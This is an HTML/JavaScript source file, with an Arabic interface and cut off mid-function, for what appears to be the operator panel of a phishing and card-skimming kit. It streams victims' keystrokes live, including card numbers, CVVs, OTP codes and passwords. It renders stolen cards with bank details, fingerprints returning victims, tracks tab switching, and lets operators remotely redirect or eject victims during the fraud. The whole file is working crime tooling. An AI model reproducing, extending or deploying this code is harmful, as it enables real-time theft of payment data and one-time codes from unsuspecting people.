<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>لوحة المراقبة</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,Arial,sans-serif;background:#f0f2f5;color:#1a1a2e;font-size:14px}
button,input,textarea,select{font-family:inherit}

/* ── Login ── */
#login{position:fixed;inset:0;background:#f0f2f5;display:flex;align-items:center;justify-content:center;z-index:9999}
.login-box{background:#fff;border-radius:20px;padding:48px 40px;width:360px;box-shadow:0 8px 40px rgba(0,0,0,.12);text-align:center}
.login-box .ico{font-size:44px;margin-bottom:12px}
.login-box h2{font-size:22px;margin-bottom:6px}
.login-box p{color:#888;font-size:13px;margin-bottom:28px}
.lf{width:100%;padding:12px 16px;border:1.5px solid #e0e0e0;border-radius:10px;font-size:14px;margin-bottom:12px;outline:none;transition:border-color .2s}
.lf:focus{border-color:#4f6ef7}
.lb{width:100%;padding:13px;background:#4f6ef7;color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:600;cursor:pointer}
.lb:hover{background:#3a57d4}
.lerr{color:#e74c3c;font-size:12px;margin-top:8px;display:none}

/* ── Top Bar ── */
.topbar{background:#fff;border-bottom:1px solid #e8eaed;padding:0 24px;height:58px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;box-shadow:0 1px 4px rgba(0,0,0,.06)}
.logo{font-size:18px;font-weight:700;color:#4f6ef7;display:flex;align-items:center;gap:8px}
.live-dot{width:9px;height:9px;background:#22c55e;border-radius:50%;animation:pulse 1.5s infinite}
.top-pills{display:flex;gap:8px}
.pill{padding:5px 14px;border-radius:20px;font-size:13px;font-weight:600;display:flex;align-items:center;gap:5px}
.pill-green{background:#dcfce7;color:#16a34a}
.pill-blue{background:#dbeafe;color:#1d4ed8}
.top-actions{display:flex;gap:8px}
.btn{padding:8px 16px;border:none;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer;transition:all .15s}
.btn-primary{background:#4f6ef7;color:#fff}
.btn-primary:hover{background:#3a57d4}
.btn-danger{background:#fee2e2;color:#dc2626}
.btn-danger:hover{background:#fecaca}
.btn-ghost{background:#f3f4f6;color:#374151}
.btn-ghost:hover{background:#e5e7eb}
.btn-sm{padding:6px 12px;font-size:12px}
.btn-gold{background:#fef9c3;color:#b45309}
.btn-gold:hover{background:#fef08a}

/* ── Tabs ── */
.tabs{display:flex;gap:2px;background:#f0f2f5;border-radius:10px;padding:3px}
.tab{padding:6px 16px;border-radius:8px;border:none;background:transparent;font-size:13px;color:#666;font-weight:500;cursor:pointer;transition:all .2s}
.tab.active{background:#fff;color:#4f6ef7;box-shadow:0 1px 4px rgba(0,0,0,.1)}

/* ── Main ── */
.main{padding:20px 24px}

/* ── Filter Bar ── */
.fbar{display:flex;align-items:center;gap:10px;margin-bottom:18px;flex-wrap:wrap}
.finput{padding:9px 14px;border:1.5px solid #e0e0e0;border-radius:10px;font-size:13px;width:220px;outline:none;background:#fff;transition:border-color .2s}
.finput:focus{border-color:#4f6ef7}
.fsel{padding:9px 14px;border:1.5px solid #e0e0e0;border-radius:10px;font-size:13px;background:#fff;outline:none;color:#444;cursor:pointer}
.fstar{padding:8px 14px;border:1.5px solid #e0e0e0;border-radius:10px;font-size:13px;background:#fff;color:#444;font-weight:500;cursor:pointer;transition:all .2s}
.fstar.on{background:#fef9c3;color:#b45309;border-color:#f59e0b}
.ml-auto{margin-right:auto}

/* ── Grid ── */
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(290px,1fr));gap:16px}

/* ── Visitor Card ── */
.vcard{background:#fff;border-radius:14px;padding:16px;box-shadow:0 1px 4px rgba(0,0,0,.07);border:1.5px solid #f0f0f0;cursor:pointer;transition:all .2s;position:relative;overflow:hidden}
.vcard:hover{box-shadow:0 4px 20px rgba(0,0,0,.12);transform:translateY(-1px)}
.vcard.starred{border-color:#f59e0b}
.vcard.card-flash{animation:cardflash .5s ease 3}
.vc-top{display:flex;align-items:flex-start;justify-content:space-between;margin-bottom:10px}
.vc-avatar{width:40px;height:40px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0;background:#eff6ff}
.vc-info{flex:1;margin:0 10px}
.vc-name{font-size:14px;font-weight:700;color:#1a1a2e;margin-bottom:2px}
.vc-ip{font-size:11px;color:#9ca3af;font-family:monospace}
.vc-right{display:flex;flex-direction:column;align-items:flex-end;gap:5px}
.status{display:flex;align-items:center;gap:4px;font-size:11px;font-weight:600;padding:3px 8px;border-radius:6px}
.status-on{background:#dcfce7;color:#16a34a}
.status-off{background:#f3f4f6;color:#9ca3af}
.star-btn{background:none;border:none;font-size:17px;color:#d1d5db;cursor:pointer;transition:color .2s;padding:0}
.star-btn.on{color:#f59e0b}
.vc-tags{display:flex;flex-wrap:wrap;gap:5px;margin-bottom:8px}
.tag{font-size:10px;padding:2px 7px;border-radius:5px;font-weight:500}
.tag-device{background:#eff6ff;color:#3b82f6}
.tag-card{background:#fefce8;color:#ca8a04}
.tag-fp{background:#f3e8ff;color:#7c3aed}
.tag-ret{background:#fce7f3;color:#be185d}
.tag-tab{background:#fff7ed;color:#ea580c}
.vc-url{font-size:10px;color:#9ca3af;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;border-top:1px solid #f5f5f5;padding-top:6px;margin-top:4px}
.new-badge{position:absolute;top:10px;left:10px;background:#4f6ef7;color:#fff;font-size:9px;font-weight:700;padding:2px 6px;border-radius:4px;animation:fadeout 4s forwards}
.empty{text-align:center;padding:60px 20px;color:#bbb;grid-column:1/-1}
.empty .ei{font-size:48px;margin-bottom:10px}

/* ── Modal ── */
.overlay{position:fixed;inset:0;background:rgba(0,0,0,.35);z-index:500;display:none;align-items:flex-start;justify-content:center;padding:20px;overflow-y:auto}
.overlay.open{display:flex}
.modal{background:#fff;border-radius:20px;width:100%;max-width:820px;box-shadow:0 20px 60px rgba(0,0,0,.18);overflow:hidden;margin:auto}
.mhead{padding:16px 22px;border-bottom:1px solid #f0f0f0;display:flex;align-items:center;justify-content:space-between;background:#fff;position:sticky;top:0;z-index:10}
.mtitle{font-size:15px;font-weight:700;display:flex;align-items:center;gap:10px}
.mclose{width:30px;height:30px;border-radius:8px;border:none;background:#f5f5f5;font-size:15px;color:#666;cursor:pointer;display:flex;align-items:center;justify-content:center}
.mclose:hover{background:#e5e5e5}
.mbody{padding:18px 22px;display:flex;flex-direction:column;gap:14px}

/* ── Sections ── */
.sec{background:#f8f9fb;border-radius:12px;overflow:hidden}
.sec-head{padding:9px 14px;background:#f0f2f5;font-size:11px;font-weight:700;color:#666;text-transform:uppercase;letter-spacing:.5px;display:flex;align-items:center;gap:6px}
.sec-body{padding:14px}

/* ── Info Grid ── */
.igrid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}
.iitem{background:#fff;padding:9px 11px;border-radius:8px;border:1px solid #f0f0f0}
.ikey{font-size:10px;color:#9ca3af;margin-bottom:2px}
.ival{font-size:13px;font-weight:600;color:#1a1a2e}

/* ── Bank Card Visual ── */
.bank-card{background:linear-gradient(135deg,#1e3a5f 0%,#2563eb 60%,#1e40af 100%);border-radius:16px;padding:22px 24px;color:#fff;position:relative;overflow:hidden;min-height:160px;display:flex;flex-direction:column;justify-content:space-between}
.bank-card::before{content:'';position:absolute;top:-40px;right:-40px;width:160px;height:160px;background:rgba(255,255,255,.06);border-radius:50%}
.bank-card::after{content:'';position:absolute;bottom:-30px;left:-30px;width:120px;height:120px;background:rgba(255,255,255,.04);border-radius:50%}
.bc-top{display:flex;justify-content:space-between;align-items:flex-start}
.bc-chip{width:36px;height:28px;background:linear-gradient(135deg,#fbbf24,#f59e0b);border-radius:5px;display:flex;align-items:center;justify-content:center}
.bc-chip-inner{width:24px;height:18px;border:1.5px solid rgba(0,0,0,.2);border-radius:3px;display:grid;grid-template-columns:1fr 1fr;gap:1px;padding:2px}
.bc-chip-cell{background:rgba(0,0,0,.15);border-radius:1px}
.bc-scheme{font-size:18px;font-weight:800;letter-spacing:1px;color:rgba(255,255,255,.9)}
.bc-number{font-size:20px;font-weight:700;letter-spacing:3px;font-family:monospace;margin:14px 0 10px;display:flex;gap:12px}
.bc-num-group{opacity:.9}
.bc-num-group.empty{opacity:.35}
.bc-bottom{display:flex;justify-content:space-between;align-items:flex-end}
.bc-field{display:flex;flex-direction:column;gap:2px}
.bc-label{font-size:9px;text-transform:uppercase;letter-spacing:.5px;opacity:.6}
.bc-value{font-size:13px;font-weight:600;font-family:monospace;letter-spacing:1px}
.bc-meta{display:flex;flex-direction:column;align-items:flex-end;gap:3px}
.bc-bank{font-size:11px;opacity:.8}
.bc-level{font-size:12px;font-weight:700;color:#fbbf24}
.bc-badges{display:flex;gap:6px;margin-top:10px;flex-wrap:wrap}
.bc-badge{font-size:10px;padding:3px 8px;border-radius:5px;background:rgba(255,255,255,.15);font-weight:500}
.bc-badge.credit{background:rgba(34,197,94,.25);color:#86efac}
.bc-badge.prepaid{background:rgba(239,68,68,.25);color:#fca5a5}

/* ── Fields ── */
.fields-list{display:flex;flex-direction:column;gap:6px}
.frow{background:#fff;border:1px solid #f0f0f0;border-radius:8px;padding:9px 12px;display:flex;align-items:flex-start;gap:9px;transition:border-color .2s}
.frow.focused{border-color:#4f6ef7;background:#eff6ff}
.frow-icon{font-size:15px;flex-shrink:0;margin-top:1px}
.frow-body{flex:1;min-width:0}
.frow-meta{display:flex;align-items:center;gap:6px;margin-bottom:2px}
.frow-name{font-size:10px;color:#9ca3af}
.ftype{font-size:9px;padding:1px 5px;border-radius:3px;font-weight:700}
.ft-card{background:#fef9c3;color:#b45309}
.ft-email{background:#dbeafe;color:#1d4ed8}
.ft-otp{background:#dcfce7;color:#16a34a}
.ft-phone{background:#fce7f3;color:#be185d}
.ft-text{background:#f3f4f6;color:#6b7280}
.frow-val{font-size:13px;font-weight:600;color:#1a1a2e;word-break:break-all}

/* ── Events ── */
.evlist{display:flex;flex-direction:column;gap:3px;max-height:160px;overflow-y:auto}
.evitem{display:flex;gap:8px;align-items:flex-start;padding:4px 0;border-bottom:1px solid #f5f5f5;font-size:12px}
.evtime{color:#bbb;font-size:10px;min-width:52px;padding-top:1px}
.evtext{color:#444;flex:1}

/* ── Redirect Buttons ── */
.redir-section{display:flex;flex-direction:column;gap:8px}
.redir-favs{display:flex;flex-wrap:wrap;gap:6px}
.redir-others{display:none;flex-wrap:wrap;gap:6px;margin-top:4px}
.redir-others.open{display:flex}
.redir-toggle{background:none;border:1px dashed #d1d5db;border-radius:6px;padding:4px 10px;font-size:11px;color:#9ca3af;cursor:pointer;transition:all .2s}
.redir-toggle:hover{border-color:#4f6ef7;color:#4f6ef7}

/* ── Controls ── */
.ctrl-row{display:flex;gap:8px}
.ctrl-input{flex:1;padding:9px 12px;border:1.5px solid #e0e0e0;border-radius:8px;font-size:13px;outline:none;transition:border-color .2s}
.ctrl-input:focus{border-color:#4f6ef7}

/* ── FP Section ── */
.fp-box{background:#f5f3ff;border:1px solid #e9d5ff;border-radius:10px;padding:12px 14px}
.fp-id{font-family:monospace;font-size:11px;color:#7c3aed;margin-bottom:8px;word-break:break-all}
.fp-name-row{display:flex;gap:8px}
.fp-input{flex:1;padding:8px 12px;border:1.5px solid #e0e0e0;border-radius:8px;font-size:13px;outline:none}
.fp-input:focus{border-color:#7c3aed}

/* ── Note ── */
.note-area{width:100%;padding:10px 12px;border:1.5px solid #e0e0e0;border-radius:8px;font-size:13px;resize:vertical;min-height:65px;outline:none;transition:border-color .2s}
.note-area:focus{border-color:#4f6ef7}

/* ── Pages Tab ── */
.pages-wrap{background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,.06)}
.pages-head{padding:14px 18px;border-bottom:1px solid #f0f0f0;display:flex;justify-content:space-between;align-items:center}
.pages-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:8px;padding:14px 18px}
.pcard{background:#f8f9fb;border:1.5px solid #e5e7eb;border-radius:10px;padding:12px;display:flex;flex-direction:column;gap:6px;transition:border-color .2s}
.pcard.fav{background:#fffbeb;border-color:#f59e0b}
.pcard-top{display:flex;align-items:flex-start;justify-content:space-between;gap:8px}
.pcard-title{font-size:13px;font-weight:600;color:#1a1a2e;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.pcard-path{font-size:10px;color:#9ca3af;font-family:monospace;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.pfav-btn{background:none;border:none;font-size:17px;cursor:pointer;flex-shrink:0}
.ptags{display:flex;gap:5px;flex-wrap:wrap}
.ptag{font-size:10px;padding:2px 6px;border-radius:4px}

/* ── History Table ── */
.htable{width:100%;border-collapse:collapse}
.htable th{padding:10px 12px;text-align:right;font-size:11px;color:#888;font-weight:600;border-bottom:2px solid #f0f0f0;background:#f8f9fb}
.htable td{padding:9px 12px;font-size:12px;border-bottom:1px solid #f5f5f5;color:#444}
.htable tr:hover td{background:#f8f9fb}

/* ── Alerts ── */
.alerts{position:fixed;bottom:20px;left:20px;z-index:600;display:flex;flex-direction:column;gap:8px;max-width:300px}
.toast{background:#fff;border-radius:12px;padding:12px 16px;display:flex;gap:10px;align-items:center;box-shadow:0 4px 20px rgba(0,0,0,.15);border-right:4px solid #4f6ef7;animation:slidein .3s ease}
.toast.card{border-right-color:#ef4444}
.toast.ret{border-right-color:#8b5cf6}
.toast-icon{font-size:22px}
.toast-title{font-size:13px;font-weight:700;color:#1a1a2e;margin-bottom:2px}
.toast-sub{font-size:11px;color:#888}

/* ── Animations ── */
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
@keyframes slidein{from{transform:translateX(-20px);opacity:0}to{transform:translateX(0);opacity:1}}
@keyframes fadeout{0%,70%{opacity:1}100%{opacity:0}}
@keyframes cardflash{0%,100%{border-color:#f0f0f0}50%{border-color:#ef4444;box-shadow:0 0 0 3px rgba(239,68,68,.2)}}

/* ── Scrollbar ── */
::-webkit-scrollbar{width:5px;height:5px}
::-webkit-scrollbar-track{background:#f5f5f5}
::-webkit-scrollbar-thumb{background:#ddd;border-radius:3px}
</style>
</head>
<body>

<!-- Login -->
<div id="login">
  <div class="login-box">
    <div class="ico">🛡️</div>
    <h2>لوحة المراقبة</h2>
    <p>أدخل بيانات الدخول</p>
    <input class="lf" id="lu" type="text" placeholder="اسم المستخدم" autocomplete="username">
    <input class="lf" id="lp" type="password" placeholder="كلمة المرور" autocomplete="current-password">
    <button class="lb" onclick="doLogin()">دخول</button>
    <div class="lerr" id="lerr">بيانات خاطئة</div>
  </div>
</div>

<!-- App -->
<div id="app" style="display:none">

  <!-- Top Bar -->
  <div class="topbar">
    <div class="logo"><span class="live-dot"></span> لوحة المراقبة</div>
    <div class="top-pills">
      <div class="pill pill-green">🟢 <span id="s-active">0</span> نشط</div>
      <div class="pill pill-blue">👥 <span id="s-total">0</span> إجمالي</div>
    </div>
    <div class="top-actions">
      <div class="tabs">
        <button class="tab active" onclick="tab('live')">🔴 مباشر</button>
        <button class="tab" onclick="tab('history')">📋 السجل</button>
        <button class="tab" onclick="tab('pages')">🔗 الصفحات</button>
      </div>
      <button class="btn btn-ghost btn-sm" onclick="exportXL()">⬇️ Excel</button>
    </div>
  </div>

  <!-- Live Tab -->
  <div class="main" id="tab-live">
    <div class="fbar">
      <input class="finput" type="text" placeholder="🔍 بحث..." id="fsearch" oninput="applyFilter()">
      <select class="fsel" id="fstatus" onchange="applyFilter()">
        <option value="all">الكل</option>
        <option value="online">متصل</option>
        <option value="offline">غادر</option>
      </select>
      <button class="fstar" id="fstar-btn" onclick="toggleStarFilter()">⭐ المميزون</button>
    </div>
    <div class="grid" id="grid">
      <div class="empty" id="empty"><div class="ei">👁️</div><p>في انتظار الزوار...</p></div>
    </div>
  </div>

  <!-- History Tab -->
  <div class="main" id="tab-history" style="display:none">
    <div style="background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,.06)">
      <div style="padding:14px 18px;border-bottom:1px solid #f0f0f0;display:flex;justify-content:space-between;align-items:center">
        <span style="font-weight:700">📋 سجل الجلسات</span>
        <button class="btn btn-primary btn-sm" onclick="loadHistory()">🔄 تحديث</button>
      </div>
      <div style="overflow-x:auto">
        <table class="htable">
          <thead><tr>
            <th>الجهاز</th><th>IP</th><th>البطاقة</th><th>المستوى</th>
            <th>وقت الدخول</th><th>الزيارات</th><th>⭐</th>
          </tr></thead>
          <tbody id="htbody"></tbody>
        </table>
      </div>
    </div>
  </div>

  <!-- Pages Tab -->
  <div class="main" id="tab-pages" style="display:none">
    <div class="pages-wrap">
      <div class="pages-head">
        <span style="font-weight:700">🔗 صفحات الموقع</span>
        <button class="btn btn-primary btn-sm" onclick="loadPages()">🔄 تحديث</button>
      </div>
      <div style="padding:10px 18px 4px;font-size:12px;color:#888">⭐ المفضلة تظهر كأزرار ثابتة في بطاقة كل زائر. الباقي مخفي ويظهر عند الطلب.</div>
      <div class="pages-grid" id="pages-grid"><div style="color:#bbb;font-size:13px;padding:20px">لا توجد صفحات بعد...</div></div>
    </div>
  </div>

</div>

<!-- Modal -->
<div class="overlay" id="overlay" onclick="closeOverlay(event)">
  <div class="modal">
    <div class="mhead">
      <div class="mtitle" id="mtitle">تفاصيل الزائر</div>
      <button class="mclose" onclick="closeModal()">✕</button>
    </div>
    <div class="mbody" id="mbody"></div>
  </div>
</div>

<!-- Alerts -->
<div class="alerts" id="alerts"></div>

<script>
const S = window.location.origin;
let token = localStorage.getItem('_dt') || '';
let sessions = {}, selId = null, starOn = false;
let sitePages = {}, sse = null;

// ── Login ──────────────────────────────────────────────────────────────────
async function doLogin() {
  const u = document.getElementById('lu').value.trim();
  const p = document.getElementById('lp').value.trim();
  try {
    const r = await fetch(S+'/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p})});
    if (!r.ok) { document.getElementById('lerr').style.display='block'; return; }
    token = (await r.json()).token;
    localStorage.setItem('_dt', token);
    boot();
  } catch(e) { document.getElementById('lerr').style.display='block'; }
}
document.getElementById('lp').addEventListener('keydown', e => { if(e.key==='Enter') doLogin(); });
if (token) boot();

function boot() {
  document.getElementById('login').style.display = 'none';
  document.getElementById('app').style.display = 'block';
  connectSSE();
  updateStats();
  setInterval(updateStats, 8000);
  loadPages();
}

// ── SSE ────────────────────────────────────────────────────────────────────
function connectSSE() {
  sse = new EventSource(`${S}/events?token=${encodeURIComponent(token)}`);
  sse.onmessage = e => {
    const {event,data} = JSON.parse(e.data);
    handle(event, data);
  };
  sse.onerror = () => setTimeout(connectSSE, 3000);
}

function handle(event, data) {
  switch(event) {
    case 'connected':
      sessions[data.id] = {...data, _online:true};
      renderCard(data.id, true);
      updateStats();
      toast('new', data);
      break;
    case 'disconnected':
      if(sessions[data.id]) { sessions[data.id]._online=false; renderCard(data.id); updateStats(); }
      break;
    case 'updated':
      sessions[data.id] = {...(sessions[data.id]||{}), ...data, _online:true};
      renderCard(data.id);
      if(selId===data.id) buildModal(data.id);
      break;
    case 'card_alert':
      flashCard(data.id);
      toast('card', sessions[data.id]||{});
      break;
    case 'card_update':
      if(sessions[data.id]) {
        sessions[data.id].cardData = data.cardData;
        sessions[data.id].binData  = data.binData;
        if(selId===data.id) refreshCardVisual();
      }
      break;
    case 'keypress':
      if(sessions[data.id]) {
        if(!sessions[data.id].fields) sessions[data.id].fields={};
        sessions[data.id].fields[data.field] = data.value;
        if(selId===data.id) refreshFields();
      }
      break;
    case 'field_focus':
      if(selId===data.id) highlightField(data.field, true);
      break;
    case 'tab_hidden':
      if(sessions[data.id]) { sessions[data.id]._tabHidden=true; renderCard(data.id); }
      break;
    case 'tab_visible':
      if(sessions[data.id]) { sessions[data.id]._tabHidden=false; renderCard(data.id); }
      break;
    case 'fp_match':
      if(sessions[data.id]) {
        sessions[data.id].fp = data.fp;
        sessions[data.id].visitCount = data.visits;
        sessions[data.id].isReturning = true;
        sessions[data.id].fpName = data.name||'';
        sessions[data.id].knownIPs = data.ips||[];
        renderCard(data.id);
        if(data.visits>1) toast('ret', sessions[data.id]);
      }
      break;
    case 'pages_updated':
      sitePages[data.site] = data.pages||[];
      renderPagesGrid();
      if(selId) refreshRedirButtons();
      break;
  }
}

// ── Render Card ────────────────────────────────────────────────────────────
function renderCard(id, isNew) {
  const s = sessions[id]; if(!s) return;
  const online = s._online !== false;
  const name = s.fpName || s.deviceName || parseUA(s.userAgent||'');
  const hasCard = !!(s.cardData && s.cardData.number);

  const html = `
    <div class="vcard${s.starred?' starred':''}${hasCard?' card-flash':''}" id="vc-${id}" onclick="openModal('${id}')">
      ${isNew?'<div class="new-badge">جديد</div>':''}
      <div class="vc-top">
        <div class="vc-avatar">📱</div>
        <div class="vc-info">
          <div class="vc-name">${s.fpName?`<span style="color:#7c3aed">${s.fpName}</span>`:name}</div>
          <div class="vc-ip">${s.ip||id.substring(0,8)}</div>
        </div>
        <div class="vc-right">
          <div class="status ${online?'status-on':'status-off'}">${online?'● نشط':'○ غادر'}</div>
          <button class="star-btn${s.starred?' on':''}" onclick="toggleStar(event,'${id}')">${s.starred?'⭐':'☆'}</button>
        </div>
      </div>
      <div class="vc-tags">
        ${s.deviceName?`<span class="tag tag-device">📱 ${s.deviceName}</span>`:''}
        ${hasCard?`<span class="tag tag-card">💳 ${s.binData?s.binData.level||s.binData.scheme:'بطاقة'}</span>`:''}
        ${s.isReturning?`<span class="tag tag-ret">🔄 زيارة #${s.visitCount||''}</span>`:''}
        ${s.fpName?`<span class="tag tag-fp">🔍 ${s.fpName}</span>`:''}
        ${s._tabHidden?'<span class="tag tag-tab">⚠️ تبويب آخر</span>':''}
      </div>
      ${s.url?`<div class="vc-url">🔗 ${s.url}</div>`:''}
    </div>`;

  const grid = document.getElementById('grid');
  document.getElementById('empty')?.remove();
  const ex = document.getElementById('vc-'+id);
  if(ex) { const t=document.createElement('div'); t.innerHTML=html; ex.replaceWith(t.firstElementChild); }
  else { const t=document.createElement('div'); t.innerHTML=html; grid.insertBefore(t.firstElementChild, grid.firstChild); }
  applyFilter();
}

// ── Card Visual ────────────────────────────────────────────────────────────
function buildCardHTML(card, bin) {
  const num = (card && card.number) || '';
  const exp = (card && card.expiry) || '';
  const cvv = (card && card.cvv)    || '';
  const g = (s, n) => s ? `<span class="bc-num-group">${s.substring(0,4).padEnd(4,'•')}</span>` : `<span class="bc-num-group empty">••••</span>`;
  const g1 = num.substring(0,4)  || '';
  const g2 = num.substring(4,8)  || '';
  const g3 = num.substring(8,12) || '';
  const g4 = num.substring(12,16)|| '';
  const scheme = bin ? bin.scheme.toUpperCase() : '';
  const schemeIcons = {VISA:'VISA',MASTERCARD:'MC',AMEX:'AMEX',DISCOVER:'DISC'};
  return `
    <div class="bc-top">
      <div class="bc-chip"><div class="bc-chip-inner"><div class="bc-chip-cell"></div><div class="bc-chip-cell"></div><div class="bc-chip-cell"></div><div class="bc-chip-cell"></div></div></div>
      <div class="bc-scheme">${schemeIcons[scheme]||scheme||'CARD'}</div>
    </div>
    <div class="bc-number">
      <span class="bc-num-group${g1?'':' empty'}">${g1?g1.padEnd(4,'•'):'••••'}</span>
      <span class="bc-num-group${g2?'':' empty'}">${g2?g2.padEnd(4,'•'):'••••'}</span>
      <span class="bc-num-group${g3?'':' empty'}">${g3?g3.padEnd(4,'•'):'••••'}</span>
      <span class="bc-num-group${g4?'':' empty'}">${g4?g4.padEnd(4,'•'):'••••'}</span>
    </div>
    <div class="bc-bottom">
      <div style="display:flex;gap:20px">
        <div class="bc-field"><div class="bc-label">تاريخ الانتهاء</div><div class="bc-value">${exp||'••/••'}</div></div>
        <div class="bc-field"><div class="bc-label">CVV</div><div class="bc-value">${cvv||'•••'}</div></div>
      </div>
      <div class="bc-meta">
        ${bin?`<div class="bc-level">${bin.level||''}</div><div class="bc-bank">${bin.bank||''} ${bin.emoji||''}</div>`:''}
      </div>
    </div>`;
}

function refreshCardVisual() {
  const s = sessions[selId]; if(!s) return;
  const sec = document.getElementById('card-sec');
  const bc  = document.getElementById('bank-card');
  if(sec && s.cardData) { sec.style.display=''; }
  if(bc && s.cardData)  { bc.innerHTML = buildCardHTML(s.cardData, s.binData); }
}

// ── Fields ─────────────────────────────────────────────────────────────────
function buildFieldsHTML(fields) {
  const entries = Object.entries(fields).filter(([k]) => !k.match(/^(card|expiry|cvv)/i));
  if(!entries.length) return '<div style="color:#bbb;font-size:12px;text-align:center;padding:8px">لا توجد بيانات بعد</div>';
  const icons={email:'📧',phone:'📱',otp:'🔑',password:'🔒',address:'📍',name:'👤',text:'✏️',coupon:'🏷️'};
  const cls={email:'ft-email',otp:'ft-otp',phone:'ft-phone',card:'ft-card'};
  return entries.map(([name,val])=>{
    const ft = getFT(name);
    const disp = name.toLowerCase().includes('password') ? '●'.repeat(val.length) : val;
    return `<div class="frow" id="fr-${name.replace(/\W/g,'_')}">
      <div class="frow-icon">${icons[ft]||icons.text}</div>
      <div class="frow-body">
        <div class="frow-meta"><span class="frow-name">${name}</span><span class="ftype ${cls[ft]||'ft-text'}">${ft}</span></div>
        <div class="frow-val">${disp||'<span style="color:#ccc">فارغ</span>'}</div>
      </div>
    </div>`;
  }).join('');
}

function refreshFields() {
  const s=sessions[selId]; if(!s) return;
  const el=document.getElementById('fields-list');
  if(el) el.innerHTML=buildFieldsHTML(s.fields||{});
}

function highlightField(field, on) {
  const el=document.getElementById('fr-'+field.replace(/\W/g,'_'));
  if(el) el.classList.toggle('focused',on);
}

function getFT(name) {
  name=name.toLowerCase();
  if(name.match(/email|mail/)) return 'email';
  if(name.match(/phone|mobile|هاتف/)) return 'phone';
  if(name.match(/otp|code|verify|كود/)) return 'otp';
  if(name.match(/password|كلمة/)) return 'password';
  if(name.match(/address|عنوان/)) return 'address';
  if(name.match(/name|اسم/)) return 'name';
  if(name.match(/coupon|promo/)) return 'coupon';
  return 'text';
}

// ── Events ─────────────────────────────────────────────────────────────────
function buildEventsHTML(events) {
  const SHOW = ['page','card','fp','control','disconnect','tab'];
  const filtered = events.filter(e => SHOW.includes(e.type));
  if(!filtered.length) return '<div style="color:#bbb;font-size:12px;text-align:center;padding:8px">لا توجد أحداث بعد</div>';
  return filtered.slice(0,30).map(ev=>{
    const t=new Date(ev.time).toLocaleTimeString('ar',{hour:'2-digit',minute:'2-digit',second:'2-digit'});
    return `<div class="evitem"><span class="evtime">${t}</span><span class="evtext">${ev.text}</span></div>`;
  }).join('');
}

// ── Redirect Buttons ───────────────────────────────────────────────────────
function buildRedirHTML(s) {
  const all = Object.values(sitePages).flat();
  if(!all.length) return '<div style="font-size:12px;color:#bbb">ستظهر أزرار الصفحات تلقائياً عند زيارة الموقع</div>';
  const favs   = all.filter(p=>p.is_favorite);
  const others = all.filter(p=>!p.is_favorite);
  const sid = s.id;
  let h = '<div class="redir-section">';
  if(favs.length) {
    h += '<div style="font-size:11px;color:#888;margin-bottom:5px">⭐ المفضلة</div>';
    h += '<div class="redir-favs">';
    favs.forEach(p=>{ h+=`<button class="btn btn-primary btn-sm" onclick="doRedirUrl('${sid}','${p.url||p.path}')" title="${p.url||p.path}">${p.title||p.path}</button>`; });
    h += '</div>';
  }
  if(others.length) {
    h += `<div class="redir-others" id="redir-others">`;
    h += '<div style="font-size:11px;color:#888;margin-bottom:5px;margin-top:6px">📄 باقي الصفحات</div><div style="display:flex;flex-wrap:wrap;gap:6px">';
    others.forEach(p=>{ h+=`<button class="btn btn-ghost btn-sm" onclick="doRedirUrl('${sid}','${p.url||p.path}')" title="${p.url||p.path}">${p.title||p.path}</button>`; });
    h += '</div></div>';
    h += `<button class="redir-toggle" onclick="toggleOthers(this)">▼ المزيد (${others.length})</button>`;
  }
  h += '</div>';
  return h;
}

function toggleOthers(btn) {
  const el=document.getElementById('redir-others'); if(!el) return;
  const open=el.classList.toggle('open');
  btn.textContent = open ? '▲ إخفاء' : `▼ المزيد (${el.querySelectorAll('.btn').length})`;
}

function refreshRedirButtons() {
  const s=sessions[selId]; if(!s) return;
  const el=document.getElementById('redir-sec');
  if(el) el.innerHTML=buildRedirHTML(s);
}

// ── Controls ───────────────────────────────────────────────────────────────
async function post(path, body) {
  return fetch(S+path,{method:'POST',headers:{'Content-Type':'application/json','x-auth-token':token},body:JSON.stringify(body)});
}

async function doRedir(id) {
  const url=document.getElementById('redir-manual')?.value; if(!url) return;
  await post('/api/control/redirect',{id,url});
  toast('info',{msg:`↗️ تم التوجيه`});
}

async function doRedirUrl(id,url) {
  await post('/api/control/redirect',{id,url});
  toast('info',{msg:`↗️ تم التوجيه إلى: ${url.split('/').pop()||url}`});
}

async function doTerminate(id) {
  const msg=document.getElementById('term-msg')?.value||'تم إنهاء جلستك.';
  await post('/api/control/terminate',{id,message:msg});
  toast('info',{msg:'🚫 تم إرسال أمر الطرد'});
}

async function toggleStar(e,id) {
  e.stopPropagation();
  const s=sessions[id]; if(!s) return;
  s.starred=!s.starred;
  await post(`/api/sessions/${id}/star`,{starred:s.starred});
  renderCard(id);
}

async function toggleStarModal(id) {
  const s=sessions[id]; if(!s) return;
  s.starred=!s.starred;
  await post(`/api/sessions/${id}/star`,{starred:s.starred});
  renderCard(id); buildModal(id);
}

async function saveNote(id) {
  const note=document.getElementById('note-area')?.value||'';
  if(sessions[id]) sessions[id].note=note;
  await post(`/api/sessions/${id}/note`,{note});
  renderCard(id);
  toast('info',{msg:'📝 تم حفظ الملاحظة'});
}

async function saveFpName(fp) {
  const name=document.getElementById('fp-name')?.value||'';
  await post(`/api/fp/${encodeURIComponent(fp)}/name`,{name});
  Object.values(sessions).forEach(s=>{ if(s.fp===fp) { s.fpName=name; renderCard(s.id); } });
  buildModal(selId);
